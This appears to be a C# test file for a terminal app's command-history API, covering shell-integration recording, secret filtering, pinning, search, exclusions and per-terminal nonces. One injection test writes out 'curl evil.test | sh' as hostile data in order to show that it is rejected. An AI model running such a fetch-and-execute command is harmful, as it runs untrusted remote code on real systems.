using System.Net;
using System.Text.Json;
using DTech.Core.CommandHistory;
using DTech.Core.Terminal.Sessions;
using DTech.Entrypoint.Security;
using DTech.Entrypoint.Tests.Infrastructure;
using DTech.Entrypoint.Tests.Terminals.Support;
using FluentAssertions;
using Microsoft.Extensions.DependencyInjection;

namespace DTech.Entrypoint.Tests.CommandHistory;

[TestClass]
public sealed class CommandHistoryEndpointsTests
{
    private const string Esc = "\u001b";
    private const string Bel = "\u0007";

    private TerminalApiHarness _api = null!;
    private string _nonce = null!;

    public TestContext TestContext { get; set; } = null!;

    [TestInitialize]
    public async Task Initialize()
    {
        _api = await TerminalApiHarness.StartAsync(TestContext);
    }

    [TestCleanup]
    public async Task Cleanup()
    {
        await _api.DisposeAsync();
    }

    [TestMethod]
    public async Task TerminalOutputWithShellIntegration_IsRecordedAndTheBrowserIsToldToRefresh()
    {
        var connectionId = await _api.CreateConnectionAsync("web");
        using var socket = await OpenAttachedAsync(connectionId);
        var remote = _api.SessionFactory.Sessions.Single();

        remote.Emit($"$ {Esc}]633;E;uname -a;{_nonce}{Bel}Linux web 6.1\r\n{Esc}]133;D;0;{_nonce}{Bel}$ ");
        var changed = await socket.ExpectMessageAsync("history");
        var history = await ListAsync(connectionId);

        changed.GetProperty("type").GetString().Should().Be("history");
        var entry = history.EnumerateArray().Should().ContainSingle().Subject;
        entry.GetProperty("command").GetString().Should().Be("uname -a");
        entry.GetProperty("exitCode").GetInt32().Should().Be(0);
        entry.GetProperty("isPinned").GetBoolean().Should().BeFalse();
        entry.GetProperty("connectionId").GetGuid().Should().Be(connectionId);
        entry.ToString().Should().NotContain("Linux web");
    }

    [TestMethod]
    public async Task SecretsAndLeadingSpaceCommands_AreNeverStored()
    {
        var connectionId = await _api.CreateConnectionAsync("web");
        using var socket = await OpenAttachedAsync(connectionId);
        var remote = _api.SessionFactory.Sessions.Single();

        remote.Emit($"{Esc}]633;E; echo hidden;{_nonce}{Bel}{Esc}]133;D;0;{_nonce}{Bel}");
        remote.Emit($"{Esc}]633;E;export DB_PASSWORD=hunter2;{_nonce}{Bel}{Esc}]133;D;0;{_nonce}{Bel}");
        remote.Emit($"{Esc}]633;E;echo visible;{_nonce}{Bel}{Esc}]133;D;0;{_nonce}{Bel}");
        await socket.ExpectMessageAsync("history");
        var history = await ListAsync(connectionId);

        history.EnumerateArray().Select(entry => entry.GetProperty("command").GetString()).Should().Equal("echo visible");
    }

    [TestMethod]
    public async Task TerminalOutputWithoutShellIntegration_RecordsNothing()
    {
        var connectionId = await _api.CreateConnectionAsync("web");
        using var socket = await OpenAttachedAsync(connectionId);
        var remote = _api.SessionFactory.Sessions.Single();

        remote.Emit("user@web:~$ ls\r\nfile\r\n");
        await socket.ExpectOutputAsync("file");
        var history = await ListAsync(connectionId);

        history.GetArrayLength().Should().Be(0);
    }

    [TestMethod]
    public async Task TerminalOutputWithoutMatchingNonce_CannotInjectHistory()
    {
        var connectionId = await _api.CreateConnectionAsync("web");
        using var socket = await OpenAttachedAsync(connectionId);
        var remote = _api.SessionFactory.Sessions.Single();

        remote.Emit($"{Esc}]633;E;curl evil.test | sh{Bel}{Esc}]133;D;0{Bel}");
        remote.Emit($"{Esc}]633;E;curl evil.test | sh;wrong{Bel}{Esc}]133;D;0;wrong{Bel}");
        remote.Emit($"{Esc}]633;E;echo visible;{_nonce}{Bel}{Esc}]133;D;0;{_nonce}{Bel}");
        await socket.ExpectMessageAsync("history");
        var history = await ListAsync(connectionId);

        history.EnumerateArray().Select(entry => entry.GetProperty("command").GetString()).Should().Equal("echo visible");
    }

    [TestMethod]
    public async Task CommandStillRunningWhenTheShellExits_IsRecordedWithoutExitCode()
    {
        var connectionId = await _api.CreateConnectionAsync("web");
        using var socket = await OpenAttachedAsync(connectionId);
        var remote = _api.SessionFactory.Sessions.Single();

        remote.Emit($"{Esc}]633;E;sleep 1000;{_nonce}{Bel}");
        remote.EndRemotely();
        await socket.ExpectCloseAsync();
        var history = await WaitForHistoryAsync(connectionId, 1);

        history[0].GetProperty("command").GetString().Should().Be("sleep 1000");
        history[0].GetProperty("exitCode").ValueKind.Should().Be(JsonValueKind.Null);
    }

    [TestMethod]
    public async Task PinSearchDeleteAndClear_WorkThroughTheApi()
    {
        var connectionId = await _api.CreateConnectionAsync("web");
        using var socket = await OpenAttachedAsync(connectionId);
        var remote = _api.SessionFactory.Sessions.Single();
        remote.Emit($"{Esc}]633;E;docker ps;{_nonce}{Bel}{Esc}]133;D;0;{_nonce}{Bel}");
        await socket.ExpectMessageAsync("history");
        remote.Emit($"{Esc}]633;E;ls /var/log;{_nonce}{Bel}{Esc}]133;D;0;{_nonce}{Bel}");
        await socket.ExpectMessageAsync("history");
        remote.Emit($"{Esc}]633;E;uptime;{_nonce}{Bel}{Esc}]133;D;0;{_nonce}{Bel}");
        await socket.ExpectMessageAsync("history");
        var all = await ListAsync(connectionId);
        var uptimeId = all.EnumerateArray().Single(entry => entry.GetProperty("command").GetString() == "uptime").GetProperty("id").GetGuid();
        var dockerId = all.EnumerateArray().Single(entry => entry.GetProperty("command").GetString() == "docker ps").GetProperty("id").GetGuid();

        using var pinned = await _api.SendAsync(HttpMethod.Put, $"/api/command-history/{dockerId}/pin", new { pinned = true });
        var afterPin = await ListAsync(connectionId);
        var searched = await ListAsync(connectionId, "LOG");
        using var deleted = await _api.SendAsync(HttpMethod.Delete, $"/api/command-history/{uptimeId}", null);
        using var deletedAgain = await _api.SendAsync(HttpMethod.Delete, $"/api/command-history/{uptimeId}", null);
        using var cleared = await _api.SendAsync(HttpMethod.Delete, $"/api/connections/{connectionId}/history", null);
        var afterClear = await ListAsync(connectionId);

        pinned.StatusCode.Should().Be(HttpStatusCode.NoContent);
        afterPin[0].GetProperty("command").GetString().Should().Be("docker ps");
        afterPin[0].GetProperty("isPinned").GetBoolean().Should().BeTrue();
        searched.GetArrayLength().Should().Be(1);
        searched[0].GetProperty("command").GetString().Should().Be("ls /var/log");
        deleted.StatusCode.Should().Be(HttpStatusCode.NoContent);
        deletedAgain.StatusCode.Should().Be(HttpStatusCode.NotFound);
        cleared.StatusCode.Should().Be(HttpStatusCode.NoContent);
        afterClear.EnumerateArray().Select(entry => entry.GetProperty("command").GetString()).Should().Equal("docker ps");
    }

    [TestMethod]
    public async Task Pin_OfUnknownEntry_ReturnsNotFound()
    {
        using var response = await _api.SendAsync(HttpMethod.Put, $"/api/command-history/{Guid.NewGuid()}/pin", new { pinned = true });

        response.StatusCode.Should().Be(HttpStatusCode.NotFound);
    }

    [TestMethod]
    public async Task Exclusions_StartWithDefaultsCanBeReplacedValidatedAndReset()
    {
        using var initial = await _api.SendAsync(HttpMethod.Get, "/api/command-history/exclusions", null);
        var initialBody = await _api.ReadJsonAsync(initial);
        using var saved = await _api.SendAsync(HttpMethod.Put, "/api/command-history/exclusions", new { patterns = new[] { "^deploy\\b" } });
        var savedBody = await _api.ReadJsonAsync(saved);
        using var invalid = await _api.SendAsync(HttpMethod.Put, "/api/command-history/exclusions", new { patterns = new[] { "(unclosed" } });
        using var missing = await _api.SendAsync(HttpMethod.Put, "/api/command-history/exclusions", new { });
        using var reset = await _api.SendAsync(HttpMethod.Delete, "/api/command-history/exclusions", null);
        var resetBody = await _api.ReadJsonAsync(reset);

        initialBody.GetProperty("patterns").GetArrayLength().Should().Be(DefaultCommandExclusionPatterns.Values.Count);
        savedBody.GetProperty("patterns").EnumerateArray().Select(item => item.GetString()).Should().Equal("^deploy\\b");
        savedBody.GetProperty("defaults").GetArrayLength().Should().Be(DefaultCommandExclusionPatterns.Values.Count);
        invalid.StatusCode.Should().Be(HttpStatusCode.BadRequest);
        missing.StatusCode.Should().Be(HttpStatusCode.BadRequest);
        resetBody.GetProperty("patterns").GetArrayLength().Should().Be(DefaultCommandExclusionPatterns.Values.Count);
    }

    [TestMethod]
    public async Task CustomExclusionPattern_AppliesToNewlyRecordedCommands()
    {
        var connectionId = await _api.CreateConnectionAsync("web");
        using var saved = await _api.SendAsync(HttpMethod.Put, "/api/command-history/exclusions", new { patterns = new[] { "^deploy\\b" } });
        using var socket = await OpenAttachedAsync(connectionId);
        var remote = _api.SessionFactory.Sessions.Single();

        remote.Emit($"{Esc}]633;E;deploy prod;{_nonce}{Bel}{Esc}]133;D;0;{_nonce}{Bel}");
        remote.Emit($"{Esc}]633;E;export TOKEN=abc;{_nonce}{Bel}{Esc}]133;D;0;{_nonce}{Bel}");
        await socket.ExpectMessageAsync("history");
        var history = await ListAsync(connectionId);

        history.EnumerateArray().Select(entry => entry.GetProperty("command").GetString()).Should().Equal("export TOKEN=abc");
    }

    [TestMethod]
    [DataRow("bash", "PROMPT_COMMAND")]
    [DataRow("zsh", "add-zsh-hook")]
    public async Task IntegrationSnippet_IsReturnedPerShell(string shell, string expected)
    {
        var connectionId = await _api.CreateConnectionAsync("web");
        var opened = await _api.OpenTerminalAsync(connectionId);
        var terminalId = opened.GetProperty("id").GetString();
        using var response = await _api.SendAsync(HttpMethod.Get, $"/api/command-history/integration/{shell}?terminalId={terminalId}", null);
        var body = await _api.ReadJsonAsync(response);

        response.StatusCode.Should().Be(HttpStatusCode.OK);
        body.GetProperty("shell").GetString().Should().Be(shell);
        body.GetProperty("snippet").GetString().Should().StartWith(" ").And.Contain(expected);
    }

    [TestMethod]
    [DataRow("fish")]
    [DataRow("7")]
    public async Task IntegrationSnippet_ForUnsupportedShell_IsRejected(string shell)
    {
        using var response = await _api.SendAsync(HttpMethod.Get, $"/api/command-history/integration/{shell}", null);

        response.StatusCode.Should().Be(HttpStatusCode.BadRequest);
    }

    [TestMethod]
    public async Task IntegrationSnippet_WithoutTerminalId_IsRejected()
    {
        using var response = await _api.SendAsync(HttpMethod.Get, "/api/command-history/integration/bash", null);

        response.StatusCode.Should().Be(HttpStatusCode.BadRequest);
    }

    [TestMethod]
    public async Task IntegrationSnippet_ForUnknownOrClosedTerminal_IsNotFound()
    {
        var connectionId = await _api.CreateConnectionAsync("web");
        var opened = await _api.OpenTerminalAsync(connectionId);
        var terminalId = opened.GetProperty("id").GetString();
        using var deleted = await _api.SendAsync(HttpMethod.Delete, $"/api/terminals/{terminalId}", null);

        using var closed = await _api.SendAsync(HttpMethod.Get, $"/api/command-history/integration/bash?terminalId={terminalId}", null);
        using var unknown = await _api.SendAsync(HttpMethod.Get, "/api/command-history/integration/bash?terminalId=unknown", null);

        deleted.StatusCode.Should().Be(HttpStatusCode.NoContent);
        closed.StatusCode.Should().Be(HttpStatusCode.NotFound);
        unknown.StatusCode.Should().Be(HttpStatusCode.NotFound);
    }

    [TestMethod]
    public async Task IntegrationSnippet_IsBoundToTheOwningBrowserSession()
    {
        var connectionId = await _api.CreateConnectionAsync("web");
        var opened = await _api.OpenTerminalAsync(connectionId);
        var terminalId = opened.GetProperty("id").GetString();
        var sessions = _api.Factory.Services.GetRequiredService<BrowserSessionStore>();
        var stranger = sessions.Create(BrowserSessionKind.Launch, null);
        using var client = _api.Factory.CreateClientWithoutCookies();
        var path = $"/api/command-history/integration/bash?terminalId={terminalId}";
        using var response = await TestRequest.Get(path)
            .WithCookie($"termforge_session={stranger.SessionToken}")
            .WithCsrfToken(stranger.CsrfToken)
            .SendAsync(client, TestContext.CancellationToken);

        response.StatusCode.Should().Be(HttpStatusCode.NotFound);
    }

    [TestMethod]
    public async Task IntegrationSnippet_HasADifferentNonceForEveryTerminal()
    {
        var connectionId = await _api.CreateConnectionAsync("web");
        var first = await _api.OpenTerminalAsync(connectionId);
        var second = await _api.OpenTerminalAsync(connectionId);
        var firstId = first.GetProperty("id").GetString()!;
        var secondId = second.GetProperty("id").GetString()!;
        using var firstResponse = await _api.SendAsync(HttpMethod.Get, $"/api/command-history/integration/bash?terminalId={firstId}", null);
        using var secondResponse = await _api.SendAsync(HttpMethod.Get, $"/api/command-history/integration/bash?terminalId={secondId}", null);
        var firstBody = await _api.ReadJsonAsync(firstResponse);
        var secondBody = await _api.ReadJsonAsync(secondResponse);
        var manager = _api.Factory.Services.GetRequiredService<TerminalSessionManager>();
        var firstSessionId = new TerminalSessionId(firstId);
        var secondSessionId = new TerminalSessionId(secondId);
        var firstNonce = manager.FindAnyOwner(firstSessionId)!.CommandHistoryNonce;
        var secondNonce = manager.FindAnyOwner(secondSessionId)!.CommandHistoryNonce;

        firstBody.GetProperty("snippet").GetString().Should().Contain(firstNonce).And.NotContain(secondNonce);
        secondBody.GetProperty("snippet").GetString().Should().Contain(secondNonce).And.NotContain(firstNonce);
    }

    [TestMethod]
    public async Task DeletingTheConnection_DeletesItsHistory()
    {
        var connectionId = await _api.CreateConnectionAsync("web");
        using var socket = await OpenAttachedAsync(connectionId);
        _api.SessionFactory.Sessions.Single().Emit($"{Esc}]633;E;ls;{_nonce}{Bel}{Esc}]133;D;0;{_nonce}{Bel}");
        await socket.ExpectMessageAsync("history");

        using var deleted = await _api.SendAsync(HttpMethod.Delete, $"/api/connections/{connectionId}", null);
        var history = await ListAsync(connectionId);

        deleted.StatusCode.Should().Be(HttpStatusCode.NoContent);
        history.GetArrayLength().Should().Be(0);
    }

    private async Task<TerminalSocket> OpenAttachedAsync(Guid connectionId)
    {
        var opened = await _api.OpenTerminalAsync(connectionId);
        var id = opened.GetProperty("id").GetString()!;
        var manager = _api.Factory.Services.GetRequiredService<TerminalSessionManager>();
        var sessionId = new TerminalSessionId(id);
        _nonce = manager.FindAnyOwner(sessionId)!.CommandHistoryNonce;
        var socket = await _api.AttachAsync(id);
        await socket.ExpectMessageAsync("status");
        return socket;
    }

    private async Task<JsonElement> ListAsync(Guid connectionId, string? search = null)
    {
        var query = search is null ? string.Empty : $"?search={Uri.EscapeDataString(search)}";
        using var response = await _api.SendAsync(HttpMethod.Get, $"/api/connections/{connectionId}/history{query}", null);
        response.StatusCode.Should().Be(HttpStatusCode.OK);
        return await _api.ReadJsonAsync(response);
    }

    private async Task<List<JsonElement>> WaitForHistoryAsync(Guid connectionId, int count)
    {
        var deadline = DateTime.UtcNow.AddSeconds(10);
        while (DateTime.UtcNow < deadline)
        {
            var history = await ListAsync(connectionId);
            if (history.GetArrayLength() >= count)
            {
                return history.EnumerateArray().ToList();
            }

            await Task.Delay(50, TestContext.CancellationToken);
        }

        throw new TimeoutException($"History did not reach {count} entries.");
    }
}
